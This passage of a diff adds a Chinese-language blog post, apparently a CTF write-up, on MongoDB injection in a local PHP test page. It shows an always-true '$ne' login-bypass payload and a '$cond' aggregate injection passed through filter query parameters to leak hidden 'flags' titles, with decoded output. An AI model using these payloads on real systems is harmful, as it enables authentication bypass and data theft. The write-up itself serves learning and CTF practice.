class="hljs-string">&quot;%s&lt;br&gt;&quot;</span>, <span class="hljs-variable">$news</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>        &#125;<br>    <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endif</span>; <span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>
+
+<p>这里第一步永真绕过,payload为。文章中用得<code>&quot;$ne&quot;=null</code>但我本地不对可能是php版本得问题</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1/mongo/test_mongo.php?username=1&amp;password=&quot;,&quot;password&quot;:&#123;&quot;$ne&quot;:null&#125;, &quot;username&quot;:&quot;admin</span><br></code></pre></div></td></tr></table></figure>
+
+<p>输出为</p>
+<p><img src="https://img-blog.csdnimg.cn/372db5c3313c40c8a192b4228294f7e3.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>第二步漏洞在<code>aggregate</code>方法</p>
+<p>filter 参数里可以填 <code>category</code>展示目录 <code>text</code>展示内容 <code>title</code>展示标题，但是都限制了5条。</p>
+<p>代码里是用的 MongoDB 聚合函数<code>aggregate</code>，下面这张图也是来自官方文档，解释了<code>aggregate</code>函数的执行过程：</p>
+<p><img src="https://img-blog.csdnimg.cn/0683249c7df14e87ae36aacadd54991d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>使用<code>aggregate</code>聚合函数时，在里面是可以使用条件判断语句的。在 MongoDB 中<code>$cond</code>表示if判断语句，匹配的符号使用<code>$eq</code>，连起来为<code>[$cond][if][$eq]</code>，当使用多个判断条件时重复该语句即可。</p>
+<p>官方文档列出的<code>$cond</code>的用法： $project可以指定输出需要查询字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">db.inventory.aggregate(<br>   [<br>      &#123;<br>         $project:<br>           &#123;<br>             item: 1,<br>             discount:<br>               &#123;<br>                 $cond: &#123; if: &#123; $gte: [ &quot;$qty&quot;, 250 ] &#125;, then: 30, else: 20 &#125;<br>               &#125;<br>           &#125;<br>      &#125;<br>   ]<br>)<br></code></pre></div></td></tr></table></figure>
+
+<p>现在我们的目的是：如果<code>$category</code>的值是 flag，那么就输出<code>$title</code>的内容，否则还是原样输出<code>$catagory</code>，照着上面的例子写成 MongoDB shell 的形式就是</p>
+<figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">db.news.aggregate(<br>   [<br>      &#123;<br>         $project:<br>           &#123;<br>             category:<br>               &#123;<br>                 $cond: &#123; <span class="hljs-attr">if</span>: &#123; <span class="hljs-attr">$eq</span>: [ <span class="hljs-string">&quot;$category&quot;</span>, <span class="hljs-string">&quot;flags&quot;</span> ] &#125;, <span class="hljs-attr">then</span>: $title, <span class="hljs-attr">else</span>: $category &#125;<br>               &#125;<br>           &#125;<br>      &#125;<br>   ]<br>)<br></code></pre></div></td></tr></table></figure>
+
+
+
+<p>转换成 PHP 数组形式传入 filter 参数：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">?filter[$cond][<span class="hljs-keyword">if</span>][$eq][]=flags&amp;filter[$cond][<span class="hljs-keyword">if</span>][$eq][]=$category&amp;filter[$cond][then]=$title&amp;filter[$cond][<span class="hljs-keyword">else</span>]=$category<br></code></pre></div></td></tr></table></figure>
+
+<p>转换成<code>raw_query</code>的形式：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">&#123;<br>    <span class="hljs-string">&quot;category&quot;</span>:<br>    &#123;<br>     <span class="hljs-string">&quot;$cond&quot;</span>:<br>     &#123;<br>      <span class="hljs-string">&quot;if&quot;</span>:<br>      &#123;<br>          <span class="hljs-string">&quot;$eq&quot;</span>: [ <span class="hljs-string">&quot;$category&quot;</span>, <span class="hljs-string">&quot;flags&quot;</span> ]<br>      &#125;,<br>      <span class="hljs-string">&quot;then&quot;</span>: <span class="hljs-string">&quot;$title&quot;</span>,<br>      <span class="hljs-string">&quot;else&quot;</span>: <span class="hljs-string">&quot;$category&quot;</span><br>     &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p><code>var_dump(json_decode(raw_query))</code>即为：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">object(stdClass)#4 (1) &#123;<br>  [<span class="hljs-string">&quot;category&quot;</span>]=&gt;<br>  object(stdClass)#3 (1) &#123;<br>    [<span class="hljs-string">&quot;$cond&quot;</span>]=&gt;<br>    object(stdClass)#2 (3) &#123;<br>      [<span class="hljs-string">&quot;if&quot;</span>]=&gt;<br>      object(stdClass)#1 (1) &#123;<br>        [<span class="hljs-string">&quot;$eq&quot;</span>]=&gt;<br>        <span class="hljs-function"><span class="hljs-title">array</span>(<span class="hljs-params"><span class="hljs-number">2</span></span>)</span> &#123;<br>          [<span class="hljs-number">0</span>]=&gt;<br>          string(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;$category&quot;</span><br>          [<span class="hljs-number">1</span>]=&gt;<br>          string(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;flags&quot;</span><br>        &#125;<br>      &#125;<br>      [<span class="hljs-string">&quot;then&quot;</span>]=&gt;<br>      string(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;$title&quot;</span><br>      [<span class="hljs-string">&quot;else&quot;</span>]=&gt;<br>      string(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;$category&quot;</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<p>参考</p>
+<p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html">https://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1602092">https://cloud.tencent.com/developer/article/1602092</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                      <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/09/26/2021-10-java%E5%AE%A1%E8%AE%A1(1)/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">羊城杯</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/09/16/2021-10-xss(1)/">
+                        <span class="hidden-mobile">xss</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
